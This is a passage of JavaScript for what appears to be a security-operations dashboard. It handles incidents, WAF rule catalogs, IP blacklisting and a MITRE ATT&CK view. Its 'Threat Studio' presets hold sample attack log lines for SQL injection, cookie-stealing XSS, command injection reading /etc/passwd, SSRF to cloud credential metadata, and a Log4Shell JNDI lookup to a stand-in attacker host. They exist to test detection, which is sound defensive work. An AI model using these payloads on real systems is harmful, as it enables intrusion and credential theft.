    <div style="font-size:12px;color:var(--text-tertiary);margin-bottom:12px;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden;line-height:1.55;">
      ${escapeHtml(inc.description || 'No description provided')}
    </div>
    <div style="display:flex;align-items:center;justify-content:space-between;padding-top:9px;border-top:1px solid var(--border-0);font-size:11px;">
      <span style="color:var(--text-secondary);display:flex;align-items:center;gap:4px;"><i data-lucide="user" style="width:11px;height:11px;"></i> ${escapeHtml(inc.assignedTo || 'Unassigned')}</span>
      <button class="btn btn-secondary btn-sm inspect-btn" style="padding:3px 8px;font-size:10.5px;">Inspect</button>
    </div>
  `;

  card.querySelector(".inspect-btn")?.addEventListener("click", (e) => {
    e.stopPropagation();
    openInspectorModal(inc);
  });

  card.addEventListener("click", () => openInspectorModal(inc));

  // Drag events
  card.addEventListener("dragstart", (e) => {
    card.classList.add("dragging");
    e.dataTransfer.setData("text/plain", inc.incidentId);
  });

  card.addEventListener("dragend", () => {
    card.classList.remove("dragging");
  });

  return card;
}

function renderTable(incidents) {
  const tbody = document.getElementById("incidents-table-body");
  if (!tbody) return;

  if (incidents.length === 0) {
    tbody.innerHTML = `<tr><td colspan="7" style="text-align:center;padding:30px;color:var(--text-muted);">No matching incidents found.</td></tr>`;
    return;
  }

  tbody.innerHTML = incidents.map(inc => {
    const sevClass = inc.severity === "CRITICAL" ? "badge-critical" : inc.severity === "HIGH" ? "badge-high" : inc.severity === "MEDIUM" ? "badge-medium" : "badge-low";
    const statusClass = (inc.status === "RESOLVED" || inc.status === "CONTAINED") ? "status-resolved" : (inc.status === "IN_PROGRESS" || inc.status === "INVESTIGATING") ? "status-in_progress" : "status-open";

    return `
      <tr style="border-bottom:1px solid var(--border-subtle);cursor:pointer;" onclick="openIncidentById('${inc.incidentId}')">
        <td style="padding:14px 18px;font-family:'JetBrains Mono',monospace;font-weight:700;font-size:12px;">${inc.incidentId}</td>
        <td style="padding:14px 18px;">
          <div style="display:flex;align-items:center;gap:6px;margin-bottom:3px;">
            <span style="font-weight:600;color:var(--text-primary);">${escapeHtml(inc.title)}</span>
            ${getSourceBadge(inc)}
          </div>
          <div style="font-size:11.5px;color:var(--text-muted);max-width:280px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">${escapeHtml(inc.description || '')}</div>
        </td>
        <td style="padding:14px 18px;"><span class="badge ${sevClass}">${inc.severity}</span></td>
        <td style="padding:14px 18px;"><span class="badge ${statusClass}">${inc.status.replace('_', ' ')}</span></td>
        <td style="padding:14px 18px;font-weight:600;font-size:12.5px;">${escapeHtml(inc.assignedTo || 'Unassigned')}</td>
        <td style="padding:14px 18px;font-family:'JetBrains Mono',monospace;font-size:11.5px;">${formatSla(inc.slaDeadline)}</td>
        <td style="padding:14px 18px;">
          <button class="btn btn-secondary btn-sm" onclick="event.stopPropagation(); openIncidentById('${inc.incidentId}')">Inspect</button>
        </td>
      </tr>
    `;
  }).join("");
}

function filterIncidents(term) {
  const lower = (term || "").toLowerCase().trim();
  if (!lower) {
    renderKanban(currentIncidents);
    renderTable(currentIncidents);
    return;
  }
  const filtered = currentIncidents.filter(i => {
    const id = (i.incidentId || "").toLowerCase();
    const title = (i.title || "").toLowerCase();
    const assigned = (i.assignedTo || "").toLowerCase();
    const desc = (i.description || "").toLowerCase();
    const sev = (i.severity || "").toLowerCase();
    const status = (i.status || "").toLowerCase();
    let payloadStr = "";
    if (i.payload) {
      payloadStr = (typeof i.payload === "string" ? i.payload : JSON.stringify(i.payload)).toLowerCase();
    }
    return id.includes(lower) || title.includes(lower) || assigned.includes(lower) ||
           desc.includes(lower) || sev.includes(lower) || status.includes(lower) ||
           payloadStr.includes(lower);
  });
  renderKanban(filtered);
  renderTable(filtered);
}

// ── KANBAN DRAG & DROP HANDLER ──
function initKanbanDragAndDrop() {
  const columns = document.querySelectorAll(".kanban-column");
  columns.forEach(col => {
    col.addEventListener("dragover", (e) => {
      e.preventDefault();
      col.style.background = "rgba(139, 92, 246, 0.08)";
    });

    col.addEventListener("dragleave", () => {
      col.style.background = "";
    });

    col.addEventListener("drop", async (e) => {
      e.preventDefault();
      col.style.background = "";
      const incidentId = e.dataTransfer.getData("text/plain");
      const newStatus = col.getAttribute("data-status");

      if (incidentId && newStatus) {
        try {
          const res = await fetch(`/incidents/${incidentId}`, {
            method: "PUT",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ status: newStatus })
          });
          if (!res.ok) throw new Error(`HTTP ${res.status}`);
          showToast(`Moved ${incidentId} to ${newStatus}`, "success");
          await refreshIncidents();
          await refreshDashboard();
        } catch (err) {
          showToast(`Failed to update status: ${err.message}`, "error");
        }
      }
    });
  });
}

// ── MODALS & WAR ROOM CONTROLLER ──
function initModals() {
  // Tabs switcher
  document.querySelectorAll(".modal-tabs .tab-btn").forEach(btn => {
    btn.addEventListener("click", () => {
      const modal = btn.closest(".modal-dialog");
      modal.querySelectorAll(".tab-btn").forEach(b => b.classList.remove("active"));
      modal.querySelectorAll(".tab-content").forEach(c => c.classList.remove("active"));

      btn.classList.add("active");
      const targetTab = modal.querySelector(`#${btn.getAttribute("data-tab")}`);
      if (targetTab) targetTab.classList.add("active");
    });
  });

  // Close modals via close button
  document.querySelectorAll("[data-close-modal]").forEach(btn => {
    btn.addEventListener("click", () => {
      const modalId = btn.getAttribute("data-close-modal");
      const modal = document.getElementById(modalId);
      if (modal) modal.style.display = "none";
    });
  });

  // Backdrop click dismissal
  document.querySelectorAll(".modal-overlay").forEach(overlay => {
    overlay.addEventListener("click", (e) => {
      if (e.target === overlay) {
        overlay.style.display = "none";
      }
    });
  });

  // Escape key dismissal
  document.addEventListener("keydown", (e) => {
    if (e.key === "Escape") {
      document.querySelectorAll(".modal-overlay").forEach(modal => {
        modal.style.display = "none";
      });
    }
  });

  // Open Create Modal
  document.getElementById("open-create-btn")?.addEventListener("click", () => {
    const modal = document.getElementById("create-modal");
    if (modal) modal.style.display = "flex";
  });

  // Create Form Submit
  document.getElementById("create-form")?.addEventListener("submit", async (e) => {
    e.preventDefault();
    const title = document.getElementById("create-title").value.trim();
    const description = document.getElementById("create-description").value.trim();
    const severity = document.getElementById("create-severity").value;
    const assignedTo = document.getElementById("create-assigned-to").value.trim();

    try {
      const res = await fetch("/incidents", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ title, description, severity, status: "OPEN", assignedTo })
      });
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      showToast("Incident created successfully", "success");
      document.getElementById("create-modal").style.display = "none";
      document.getElementById("create-form").reset();
      await refreshDashboard();
      await refreshIncidents();
    } catch (err) {
      showToast(`Error creating incident: ${err.message}`, "error");
    }
  });

  // Forensic Download Button
  document.getElementById("download-forensics-btn")?.addEventListener("click", () => {
    if (!activeIncident) return;
    const payload = activeIncident.payload || {
      incidentId: activeIncident.incidentId,
      title: activeIncident.title,
      severity: activeIncident.severity,
      description: activeIncident.description,
      createdAt: activeIncident.createdAt
    };

    const blob = new Blob([JSON.stringify(payload, null, 2)], { type: "application/json" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `Forensic_Report_${activeIncident.incidentId}.json`;
    a.click();
    URL.revokeObjectURL(url);
    showToast("Forensic Evidence report downloaded", "success");
  });

  // Active SOAR Automated Containment Button
  document.getElementById("execute-containment-btn")?.addEventListener("click", async () => {
    if (!activeIncident) return;
    try {
      let sourceIp = null;
      let payload = activeIncident.payload;
      if (typeof payload === "string") {
        try { payload = JSON.parse(payload); } catch {}
      }
      if (payload && typeof payload === "object") {
        sourceIp = payload.sourceIp || payload.ip || payload.sourceIPAddress || payload.src_ip || (payload.normalizedLog && payload.normalizedLog.sourceIp);
      }
      if (!sourceIp && activeIncident.description) {
        const ipMatch = activeIncident.description.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/);
        if (ipMatch) sourceIp = ipMatch[0];
      }
      if (!sourceIp) sourceIp = "127.0.0.1";

      const res = await fetch(`/api/containment/${encodeURIComponent(activeIncident.incidentId)}/contain`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ ip: sourceIp, reason: `Contained via War Room (${activeIncident.title})` })
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || `HTTP ${res.status}`);

      showToast(`Active Gateway 403 containment enforced on IP ${sourceIp}`, "success");
      document.getElementById("inspector-modal").style.display = "none";
      await refreshDashboard();
      await refreshIncidents();
      await refreshBlacklist();
    } catch (err) {
      showToast(`Containment failed: ${err.message}`, "error");
    }
  });

  // Add Comment
  document.getElementById("submit-comment-btn")?.addEventListener("click", async () => {
    const input = document.getElementById("comment-input");
    const text = input.value.trim();
    if (!text || !activeIncident) return;

    try {
      const res = await fetch(`/incidents/${activeIncident.incidentId}/comments`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ note: text, author: "SOC-Analyst" })
      });
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      input.value = "";
      const incRes = await fetch(`/incidents/${activeIncident.incidentId}`);
      const updated = await incRes.json();
      openInspectorModal(updated);
      showToast("Audit note posted", "success");
    } catch (err) {
      showToast(`Failed to post note: ${err.message}`, "error");
    }
  });
}

function openIncidentById(id) {
  const inc = currentIncidents.find(i => i.incidentId === id);
  if (inc) openInspectorModal(inc);
}
window.openIncidentById = openIncidentById;

function openInspectorModal(incident) {
  activeIncident = incident;
  const modal = document.getElementById("inspector-modal");
  if (!modal) return;

  document.getElementById("modal-incident-id").textContent = incident.incidentId;
  document.getElementById("modal-incident-title").textContent = incident.title;
  document.getElementById("modal-severity").textContent = incident.severity;
  document.getElementById("modal-severity").className = `badge ${incident.severity === 'CRITICAL' ? 'badge-critical' : incident.severity === 'HIGH' ? 'badge-high' : 'badge-low'}`;
  document.getElementById("modal-status").textContent = incident.status.replace('_', ' ');
  document.getElementById("modal-assignee").textContent = incident.assignedTo || 'Unassigned';
  document.getElementById("modal-sla").textContent = formatSla(incident.slaDeadline);

  const modalSource = document.getElementById("modal-source");
  if (modalSource) {
    if (incident.eventSource === "OFFICIAL_CRS" || incident.assignedTo === "OWASP-CRS-Engine") {
      modalSource.textContent = "Official CRS v4.3";
      modalSource.className = "badge badge-crs";
    } else if (incident.eventSource === "CUSTOM_WAF") {
      modalSource.textContent = "Custom Sensor";
      modalSource.className = "badge badge-custom-waf";
    } else if (incident.assignedTo === "Simulator") {
      modalSource.textContent = "Traffic Simulator";
      modalSource.className = "badge badge-simulated";
    } else {
      modalSource.textContent = incident.eventSource || "Manual SOC";
      modalSource.className = "badge badge-low";
    }
  }

  let extraContext = ``;
  if (incident.wafTransactionId) {
    extraContext += `\n[WAF Transaction ID] ${incident.wafTransactionId}`;
  }
  if (incident.eventSource) {
    extraContext += `\n[Detection Engine] ${incident.eventSource === "OFFICIAL_CRS" ? "OWASP Core Rule Set v4.3 (Docker Nginx-ModSec :8080)" : incident.eventSource}`;
  }
  if (incident.mitreTechnique) {
    try {
      const mitre = typeof incident.mitreTechnique === 'string' ? JSON.parse(incident.mitreTechnique) : incident.mitreTechnique;
      if (mitre.id && mitre.name) {
        extraContext += `\nMITRE ATT&CK: ${mitre.id} - ${mitre.name}`;
      } else {
        extraContext += `\nMITRE ATT&CK: ${incident.mitreTechnique}`;
      }
    } catch {
      extraContext += `\nMITRE ATT&CK: ${incident.mitreTechnique}`;
    }
  }

  document.getElementById("modal-desc").textContent = (incident.description || "No context description provided.") + extraContext;

  // Forensic Evidence View
  const forensicCode = document.getElementById("modal-forensic-code");
  if (forensicCode) {
    let parsedPayload = incident.payload;
    if (typeof parsedPayload === "string") {
      try { parsedPayload = JSON.parse(parsedPayload); } catch {}
    }
    forensicCode.textContent = JSON.stringify(parsedPayload || {
      incidentId: incident.incidentId,
      threatType: incident.title,
      severity: incident.severity,
      description: incident.description,
      rootCause: "Dynamic OWASP WAF inspection match"
    }, null, 2);
  }

  // SOAR Playbook View
  const playbookWrap = document.getElementById("modal-playbook-content");
  if (playbookWrap) {
    let playbook = incident.playbook;
    if (typeof playbook === "string") {
      try { playbook = JSON.parse(playbook); } catch {}
    }

    if (playbook) {
      playbookWrap.innerHTML = `
        <div style="font-weight:700;color:var(--violet-400);margin-bottom:6px;">Summary</div>
        <div style="color:var(--text-secondary);font-size:13px;margin-bottom:12px;">${escapeHtml(playbook.summary || '')}</div>
        <div style="font-weight:700;color:var(--violet-400);margin-bottom:6px;">Likely Root Cause</div>
        <div style="color:var(--text-secondary);font-size:13px;margin-bottom:12px;">${escapeHtml(playbook.rootCause || '')}</div>
        <div class="card-label">Recommended Remediation</div>
        <div class="code-snippet">${escapeHtml(playbook.codeRemediation || playbook.immediateAction || '')}</div>
      `;
    } else {
      playbookWrap.innerHTML = `
        <div style="padding:14px;background:rgba(255,255,255,0.02);border:1px solid var(--border-subtle);border-radius:var(--radius-sm);line-height:1.6;">
          <div style="font-weight:700;color:var(--violet-400);margin-bottom:4px;">Automated Active Gateway SOAR Containment</div>
          <div style="color:var(--text-secondary);font-size:12.5px;">Click "Enforce Gateway 403 Containment" to blacklist the attacker IP at the Layer-7 reverse proxy gateway. All subsequent requests from the host will receive HTTP 403 Forbidden.</div>
        </div>
      `;
    }
  }

  // Timeline View
  const timelineStream = document.getElementById("modal-timeline-stream");
  if (timelineStream) {
    let timeline = incident.timeline || [];
    if (typeof timeline === "string") {
      try { timeline = JSON.parse(timeline); } catch { timeline = []; }
    }
    if (timeline.length === 0) {
      timelineStream.innerHTML = `<div style="color:var(--text-muted);font-size:12px;padding:8px 0;">No audit notes recorded yet.</div>`;
    } else {
      timelineStream.innerHTML = timeline.map(t => `
        <div style="background:rgba(0,0,0,0.3);padding:10px 14px;border-radius:var(--radius-sm);border-left:3px solid var(--violet-500);">
          <div style="display:flex;justify-content:space-between;font-size:11px;color:var(--text-muted);margin-bottom:4px;">
            <span>${escapeHtml(t.by || t.author || 'System')}</span>
            <span>${t.timestamp ? new Date(t.timestamp).toLocaleTimeString() : ''}</span>
          </div>
          <div style="font-size:12.5px;color:var(--text-primary);">${escapeHtml(t.action || '')} ${t.note ? `: ${escapeHtml(t.note)}` : ''}</div>
        </div>
      `).join("");
    }
  }

  modal.style.display = "flex";
  if (window.lucide) lucide.createIcons();
}

// ── THREAT STUDIO & PRESET HANDLERS ──
function initPresets() {
  const presets = {
    sqli: `198.51.100.22 - - [${new Date().toISOString()}] "GET /api/waf/products?search=' UNION SELECT null, username, password FROM users WHERE '1'='1 -- HTTP/1.1" 500 1024`,
    xss: `103.251.167.5 - - [${new Date().toISOString()}] "POST /comments HTTP/1.1" 201 450 - body: <script>alert(document.cookie)</script>`,
    cmdi: `192.168.1.100 - - [${new Date().toISOString()}] "POST /api/waf/lookup HTTP/1.1" 200 890 - body: {"host": "127.0.0.1; cat /etc/passwd | whoami"}`,
    ssrf: `10.0.0.50 - - [${new Date().toISOString()}] "GET /api/waf/fetch-url?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1" 200 300`,
    splunk: `{"sourcetype": "stream:http", "src_ip": "10.0.1.25", "dest_ip": "10.0.2.50", "http_method": "POST", "uri_path": "/api/waf/login", "payload": "' OR '1'='1"}`,
    log4j: `185.191.171.4 - - [${new Date().toISOString()}] "POST /api/waf/login HTTP/1.1" 400 320 - User-Agent: \${jndi:ldap://evil-attacker.com:1389/Exploit}`,
    entropy: `203.0.113.88 - - [${new Date().toISOString()}] "POST /api/waf/eval HTTP/1.1" 200 4096 - payload: eval(base64_decode('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0'))`,
    json: JSON.stringify({
      eventVersion: "1.08",
      sourceIPAddress: "198.51.100.99",
      userAgent: "aws-sdk-go/1.44.0",
      requestParameters: { query: "DROP TABLE users;" },
      responseCode: 403
    }, null, 2),
    clean: `172.56.21.89 - - [${new Date().toISOString()}] "GET /api/waf/products?search=wireless+noise+canceling+headphones HTTP/1.1" 200 42 "Mozilla/5.0"`
  };

  document.querySelectorAll(".preset-btn").forEach(btn => {
    btn.addEventListener("click", () => {
      const p = btn.getAttribute("data-preset");
      const textarea = document.getElementById("studio-log-input");
      if (textarea && presets[p]) {
        textarea.value = presets[p];
      }
    });
  });

  document.getElementById("studio-analyze-btn")?.addEventListener("click", async () => {
    const input = document.getElementById("studio-log-input");
    const raw = input.value.trim();
    if (!raw) {
      showToast("Please enter or paste a log string to analyze.", "warning");
      return;
    }

    try {
      const res = await fetch("/analyze-logs", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ logs: raw })
      });
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      const data = await res.json();
      const detection = data.detection;
      const card = document.getElementById("studio-result-card");
      if (!card) return;

      document.getElementById("studio-threat-title").textContent = detection.type !== "none" ? detection.type : "No Threat Detected (Clean Traffic)";
      document.getElementById("studio-severity-badge").textContent = detection.severity;
      document.getElementById("studio-severity-badge").className = `badge ${detection.severity === 'CRITICAL' ? 'badge-critical' : detection.severity === 'HIGH' ? 'badge-high' : 'badge-low'}`;
      document.getElementById("studio-mitre-badge").textContent = detection.mitre ? `MITRE ${detection.mitre.id}` : "Clean Signature";
      document.getElementById("studio-score-badge").textContent = `Threat Score: ${detection.threatScore || 0}/100`;

      document.getElementById("diag-format").textContent = detection.normalizedLog?.format || "Unknown";
      document.getElementById("diag-ip").textContent = detection.normalizedLog?.sourceIp || "unknown";
      document.getElementById("diag-entropy").textContent = `${detection.entropy || 0} bits/char`;
      document.getElementById("diag-velocity").textContent = detection.velocity?.isAnomaly ? "ANOMALY (>35 req/10s)" : "Normal (<3 req/s)";
      document.getElementById("diag-velocity").style.color = detection.velocity?.isAnomaly ? "var(--sev-crit)" : "var(--status-resolved)";

      document.getElementById("diag-payload").textContent = detection.extractedPayload || "No suspicious payload extracted";

      const playbookSummary = document.getElementById("diag-playbook-summary");
      const playbookCode = document.getElementById("diag-playbook-code");

      if (detection.playbook) {
        playbookSummary.textContent = detection.playbook.summary;
        playbookCode.textContent = detection.playbook.codeRemediation || detection.playbook.immediateAction;
        document.getElementById("diag-playbook-wrap").style.display = "block";
      } else {
        playbookSummary.textContent = "Traffic verified safe. No automated remediation required.";
        playbookCode.textContent = "// Status: Verified Safe / No containment rule required";
      }

      card.style.display = "block";
      showToast(detection.status === "threat_detected" ? `Intercepted ${detection.type}!` : "Traffic analyzed: Clean", detection.status === "threat_detected" ? "warning" : "success");
      if (window.lucide) lucide.createIcons();
    } catch (err) {
      showToast(`Analysis failed: ${err.message}`, "error");
    }
  });

  document.getElementById("studio-clear-btn")?.addEventListener("click", () => {
    document.getElementById("studio-log-input").value = "";
    document.getElementById("studio-result-card").style.display = "none";
  });
}

// ── SIGNATURE RULES CATALOG VIEW ──
async function initRulesCatalog() {
  const container = document.getElementById("rules-catalog-list");
  const countBadge = document.getElementById("rules-count-badge");
  if (!container) return;

  try {
    const res = await fetch("/api/rules");
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    const data = await res.json();

    const official = data.officialCrs;
    const custom = data.customSensor;

    if (countBadge) {
      const crsRules = official?.upstreamSecRulesCount || 675;
      const customCount = custom?.count || 28;
      countBadge.textContent = `${crsRules + customCount} Signatures (${crsRules} CRS / ${customCount} Custom)`;
    }

    let html = "";

    // 1. Official OWASP Core Rule Set Section
    if (official && official.ruleFamilies) {
      const isOnline = official.gatewayStatus === "ONLINE";
      html += `
        <div style="background:rgba(56,189,248,0.06);border:1px solid rgba(56,189,248,0.25);border-radius:var(--radius-sm);padding:14px 18px;margin-bottom:12px;">
          <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px;flex-wrap:wrap;gap:8px;">
            <div style="display:flex;align-items:center;gap:8px;">
              <i data-lucide="shield-check" style="width:18px;height:18px;color:#38bdf8;"></i>
              <span style="font-weight:700;font-size:14px;color:#38bdf8;">${escapeHtml(official.engine)} ${escapeHtml(official.version || 'OWASP_CRS/4.30.0')}</span>
            </div>
            <div style="display:flex;align-items:center;gap:8px;">
              <span class="badge ${isOnline ? 'badge-crs' : 'badge-critical'}">${isOnline ? 'GATEWAY ONLINE' : 'GATEWAY OFFLINE'}</span>
              <span class="badge badge-crs">${official.upstreamSecRulesCount || 675} SecRules (27 Files)</span>
            </div>
          </div>
          <p style="font-size:12px;color:var(--text-secondary);margin:0;line-height:1.5;">
            Running on ${escapeHtml(official.modsecVersion || 'ModSecurity v3.0.17')} / ${escapeHtml(official.nginxVersion || 'nginx/1.30.6')} via Docker reverse proxy at <a href="${escapeHtml(official.gatewayUrl)}" target="_blank" style="color:#38bdf8;text-decoration:none;">${escapeHtml(official.gatewayUrl)}</a>.
            Collaborative Inbound Anomaly Threshold: ${official.anomalyInboundThreshold || 5} | Paranoia Level: PL${official.blockingParanoiaLevel || 1}
          </p>
        </div>
        <div style="display:grid;grid-template-columns:1fr;gap:8px;margin-bottom:24px;">
      `;

      official.ruleFamilies.forEach(f => {
        html += `
          <div style="background:rgba(8,12,22,0.85);border:1px solid rgba(56,189,248,0.18);border-radius:var(--radius-sm);padding:12px 16px;">
            <div style="display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:6px;flex-wrap:wrap;">
              <div style="display:flex;align-items:center;gap:10px;">
                <span style="font-family:'JetBrains Mono',monospace;font-weight:700;font-size:12px;color:#38bdf8;">${escapeHtml(f.family)}</span>
                <span style="font-weight:600;font-size:13px;color:#fff;">${escapeHtml(f.name)}</span>
              </div>
              <div style="display:flex;align-items:center;gap:8px;">
                ${f.mitre ? `<span class="badge badge-low">MITRE ${escapeHtml(f.mitre.id)}</span>` : ''}
                <span class="badge badge-crs">${f.ruleCount} Rules (${f.ruleRange})</span>
                <span class="badge badge-high">${escapeHtml(f.severity)}</span>
              </div>
            </div>
            <div style="font-size:12px;color:var(--text-muted);line-height:1.5;">${escapeHtml(f.description)}</div>
          </div>
        `;
      });
      html += `</div>`;
    }

    // 2. Custom Application Novelty Signatures
    if (custom && custom.rules) {
      html += `
        <div style="background:rgba(139,92,246,0.06);border:1px solid rgba(139,92,246,0.25);border-radius:var(--radius-sm);padding:14px 18px;margin-bottom:12px;">
          <div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px;">
            <div style="display:flex;align-items:center;gap:8px;">
              <i data-lucide="crosshair" style="width:18px;height:18px;color:var(--violet-400);"></i>
              <span style="font-weight:700;font-size:14px;color:var(--violet-300);">${escapeHtml(custom.engine)}</span>
            </div>
            <span class="badge badge-custom-waf">${custom.count} Custom Rules Active</span>
          </div>
          <p style="font-size:12px;color:var(--text-secondary);margin:4px 0 0 0;line-height:1.5;">
            In-process heuristic detection layer utilizing Shannon entropy calculation, velocity anomaly tracking, and regular expression signatures.
          </p>
        </div>
        <div style="display:grid;grid-template-columns:1fr;gap:8px;">
      `;

      custom.rules.forEach(r => {
        html += `
          <div style="background:rgba(8,12,22,0.8);border:1px solid var(--border-subtle);border-radius:var(--radius-sm);padding:12px 16px;display:flex;align-items:center;justify-content:space-between;gap:12px;">
            <div style="display:flex;align-items:center;gap:12px;">
              <span style="font-family:'JetBrains Mono',monospace;font-weight:700;font-size:12px;color:var(--violet-400);">${escapeHtml(r.id)}</span>
              <div>
                <div style="font-weight:600;font-size:13px;color:#fff;">${escapeHtml(r.name || r.category)}</div>
                <div style="font-size:11.5px;color:var(--text-muted);">${escapeHtml(r.category || '')} &bull; Base Score: ${r.baseScore || 70}</div>
              </div>
            </div>
            <div style="display:flex;align-items:center;gap:8px;">
              ${r.mitre ? `<span class="badge badge-low">MITRE ${escapeHtml(r.mitre.id)}</span>` : ''}
              <span class="badge ${r.severity === 'CRITICAL' ? 'badge-critical' : r.severity === 'HIGH' ? 'badge-high' : 'badge-low'}">${r.severity || 'MEDIUM'}</span>
            </div>
          </div>
        `;
      });
      html += `</div>`;
    }

    container.innerHTML = html;
    if (window.lucide) lucide.createIcons();
  } catch (err) {
    console.error("Rules catalog error:", err);
    container.innerHTML = `<div style="color:var(--sev-crit);">Failed to load rules: ${err.message}</div>`;
  }
}

// ── BLACKLIST CONTROLLER ──
async function refreshBlacklist() {
  try {
    const res = await fetch("/api/containment/blacklist");
    if (!res.ok) return;
    const data = await res.json();
    const list = data.blacklist || [];

    const badge = document.getElementById("contained-count-badge");
    if (badge) badge.textContent = list.length;

    const tbody = document.getElementById("blacklist-table-body");
    if (!tbody) return;

    if (list.length === 0) {
      tbody.innerHTML = `<tr><td colspan="4" style="text-align:center;padding:24px;color:var(--text-muted);">No IPs currently contained. Gateway is clear.</td></tr>`;
      return;
    }

    tbody.innerHTML = list.map(item => `
      <tr style="border-bottom:1px solid var(--border-subtle);">
        <td style="padding:10px 14px;font-family:'JetBrains Mono',monospace;color:var(--sev-crit);font-weight:700;">${escapeHtml(item.ip)}</td>
        <td style="padding:10px 14px;color:var(--text-secondary);">${escapeHtml(item.reason || 'Manual Containment')}</td>
        <td style="padding:10px 14px;font-family:'JetBrains Mono',monospace;font-size:11.5px;color:var(--text-muted);">${item.blockedAt ? new Date(item.blockedAt).toLocaleTimeString() : 'Recent'}</td>
        <td style="padding:10px 14px;">
          <button class="btn btn-secondary btn-sm" onclick="releaseBlacklistedIp('${item.ip}')" style="padding:3px 8px;font-size:11px;">
            <i data-lucide="unlock" style="width:11px;height:11px;"></i> Release
          </button>
        </td>
      </tr>
    `).join("");

    if (window.lucide) lucide.createIcons();
  } catch (err) {
    console.error("Failed to refresh blacklist:", err);
  }
}

async function releaseBlacklistedIp(ip) {
  try {
    const res = await fetch(`/api/containment/${encodeURIComponent(ip)}/release`, {
      method: "POST"
    });
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    showToast(`IP ${ip} released from active blacklist`, "success");
    await refreshBlacklist();
  } catch (err) {
    showToast(`Failed to release IP: ${err.message}`, "error");
  }
}
window.releaseBlacklistedIp = releaseBlacklistedIp;

// ── UTILITY HELPERS ──
function showToast(message, type = "info") {
  const container = document.getElementById("toast-container");
  if (!container) return;

  const toast = document.createElement("div");
  toast.className = `toast toast-${type}`;
  const icon = type === 'error' ? 'alert-triangle' : type === 'success' ? 'check-circle-2' : 'info';
  const color = type === 'error' ? 'var(--sev-crit)' : type === 'success' ? 'var(--status-resolved)' : 'var(--violet-400)';
  toast.innerHTML = `<i data-lucide="${icon}" style="width:18px;height:18px;color:${color};flex-shrink:0;"></i> <span>${escapeHtml(message)}</span>`;

  container.appendChild(toast);
  if (window.lucide) lucide.createIcons();

  setTimeout(() => {
    toast.style.opacity = "0";
    toast.style.transform = "translateX(20px)";
    toast.style.transition = "all 0.3s ease";
    setTimeout(() => toast.remove(), 300);
  }, 4000);
}

function formatSla(deadline) {
  if (!deadline) return "—";
  const diff = new Date(deadline).getTime() - Date.now();
  if (diff <= 0) return "OVERDUE";
  const hours = Math.floor(diff / (1000 * 60 * 60));
  const mins = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
  return `${hours}h ${mins}m left`;
}

function escapeHtml(str) {
  if (!str) return "";
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

// ═══════════════════════════════════════════════════════════════════════
// MITRE ATT&CK ENTERPRISE MATRIX NAVIGATOR
// ═══════════════════════════════════════════════════════════════════════
const MITRE_TACTICS_DATA = [
  {
    name: "Reconnaissance",
    techniques: [
      { id: "T1595", name: "Active Vulnerability Scan", desc: "Automated scanner probing (Nuclei, Sqlmap, Nikto, Nmap, Gobuster)" },
      { id: "T1592", name: "Host Route Discovery", desc: "Forced route discovery and directory brute forcing" }
    ]
  },
  {
    name: "Initial Access",
    techniques: [
      { id: "T1190", name: "Exploit Public-Facing App", desc: "Layer-7 exploit vectors (SQLi, Log4Shell, Spring4Shell)" },
      { id: "T1566", name: "Spearphishing Redirection", desc: "Open redirect & malicious URI scheme propagation" }
    ]
  },
  {
    name: "Execution",
    techniques: [
      { id: "T1059.004", name: "Unix Shell Chaining", desc: "Bash/sh piping, command injection, and remote execution" },
      { id: "T1059.001", name: "PowerShell & Windows RCE", desc: "Encoded PowerShell invocations, cmd.exe /c execution" },
      { id: "T1059.007", name: "JavaScript / XSS DOM Sink", desc: "Reflected, stored, and DOM sink script execution" }
    ]
  },
  {
    name: "Persistence",
    techniques: [
      { id: "T1505", name: "Server Component: Web Shell", desc: "Backdoor file upload and shell script implantation" }
    ]
  },
  {
    name: "Defense Evasion",
    techniques: [
      { id: "T1027", name: "Obfuscated / Packed Code", desc: "High Shannon entropy payloads, base64 packing, shellcode" },
      { id: "T1027.001", name: "Comment Interleaving", desc: "SQL comment interleaving to bypass naive regex filters" }
    ]
  },
  {
    name: "Credential Access",
    techniques: [
      { id: "T1110", name: "Brute Force & Rate Burst", desc: "Rapid authentication brute-forcing and credential stuffing" },
      { id: "T1552", name: "DOM Storage & Cookie Theft", desc: "Session token extraction via document.cookie" }
    ]
  },
  {
    name: "Discovery",
    techniques: [
      { id: "T1083", name: "File & Directory Discovery", desc: "Path traversal, LFI, and sensitive file probing (/etc/passwd, win.ini)" },
      { id: "T1082", name: "Database Schema Extraction", desc: "Information_schema, sys.tables, and version enumeration" }
    ]
  },
  {
    name: "Command & Control",
    techniques: [
      { id: "T1090", name: "Multi-Hop Proxy & SSRF", desc: "Server-side request forgery to cloud IMDS metadata endpoints" }
    ]
  }
];

function renderMitreMatrix(mitreStats = {}) {
  const container = document.getElementById("mitre-matrix-container");
  const badge = document.getElementById("mitre-active-techniques-badge");
  if (!container) return;

  let activeCount = 0;

  container.innerHTML = MITRE_TACTICS_DATA.map(tactic => {
    const techCards = tactic.techniques.map(tech => {
      // Check if technique ID or parent tactic is active in mitreStats
